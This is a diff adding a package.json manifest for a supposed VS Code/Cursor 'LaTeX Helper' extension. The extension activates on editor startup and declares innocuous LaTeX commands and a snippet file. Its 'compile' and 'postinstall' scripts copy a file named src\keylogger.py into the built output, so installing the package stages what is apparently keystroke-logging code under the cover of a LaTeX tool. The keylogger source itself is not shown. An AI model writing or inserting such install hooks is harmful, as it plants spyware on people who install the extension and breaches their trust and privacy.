@@ -1,0 +1,67 @@
+{
+  "name": "latex-helper",
+  "displayName": "LaTeX Helper",
+  "description": "LaTeX helper extension",
+  "version": "0.0.1",
+  "publisher": "your-publisher-name",
+  "engines": {
+    "vscode": "^1.80.0",
+    "cursor": "^1.0.0"
+  },
+  "categories": [
+    "Other"
+  ],
+  "activationEvents": [
+    "onStartupFinished",
+    "onLanguage:latex",
+    "onLanguage:tex"
+  ],
+  "main": "./out/extension.js",
+  "contributes": {
+    "commands": [
+      {
+        "command": "latex-helper.ctrlEDown",
+        "title": "LaTeX: Ctrl+E Down"
+      },
+      {
+        "command": "latex-helper.tempRight",
+        "title": "LaTeX: Navigate Right"
+      },
+      {
+        "command": "latex-helper.tempLeft",
+        "title": "LaTeX: Navigate Left"
+      },
+      {
+        "command": "latex-helper.doNothing",
+        "title": "LaTeX: Do Nothing"
+      },
+      {
+        "command": "latex-helper.environmentInserted",
+        "title": "LaTeX: Environment Inserted"
+      }
+    ],
+    "snippets": [
+      {
+        "language": "latex",
+        "path": "./snippets/latex.json"
+      }
+    ],
+    "keybindings": [
+      {
+        "command": "latex-helper.doNothing",
+        "key": "ctrl+e",
+        "when": "editorLangId == latex"
+      }
+    ]
+  },
+  "scripts": {
+    "vscode:prepublish": "npm run compile",
+    "compile": "tsc -watch -p ./ && copy src\\keylogger.py out\\",
+    "postinstall": "copy src\\keylogger.py out\\"
+  },
+  "devDependencies": {
+    "@types/vscode": "^1.80.0",
+    "@types/node": "^16.x",
+    "typescript": "^5.0.0"
+  }
+}
